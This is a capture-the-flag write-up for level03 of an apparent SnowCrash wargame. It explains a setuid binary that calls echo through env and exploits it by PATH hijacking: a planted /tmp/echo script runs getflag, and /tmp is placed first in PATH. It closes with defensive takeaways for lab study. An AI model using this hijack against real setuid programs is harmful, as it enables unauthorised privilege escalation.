# LEVEL03

## Analysis

## Enumeration 

In the challenge we observe a ELF 32-bits binary `level03`.
```bash
    $ file level03
```

Output:
```txt
    level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```
## Investigation

Running this binary diplays a message `Exploit me`:
```bash
    level03@SnowCrash:~$ ./level03
    Exploit me
```

To understand its behavior, we inspect embedded strings:
```bash
    strings ./level03 
```
Relevant ouput:
```txt
    [...]
    /usr/bin/env echo Exploit me
    [...]
```
This indicates that the binary executes an external command using /usr/bin/env.

## Vulnerability

This programs relies on `env` to execute `echo` command without using an absolute path. This introduces a PATH resolution vulnerability, where the system resolves executables based on the PATH environment variable.
If a malicious executable named echo is placed earlier in the PATH, it will be executed instead of the intended system binary. This is known as PATH hijacking.

## Exploitation

We first create a malicious script named "echo" in writable /tmp directory to execute `getflag`:
```
    $ cat > /tmp/echo <<'EOF'
    > #!/bin/sh
    > exec /bin/sh -c 'getflag'
    > EOF
    $ chmod +x /tmp/echo
```

Then we make modify PATH variable so that /tmp is prioritized:
```bash
    $export PATH=/tmp:$PATH
```

When the program is executed again, the system resolves `echo` to `/tmp/echo` instead of `/usr/bin/echo`, resulting in execution of the malicious script.
```bash
    $ ./level03 
    Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Takeaways

- Executing commands without absolute paths can introduce PATH hijacking vulnerabilities.
- The PATH environment variable directly influences binary resolution order.
- Writable directories included early in PATH can lead to command injection-like behavior.
- `strings` is useful for identifying external command usage inside binaries.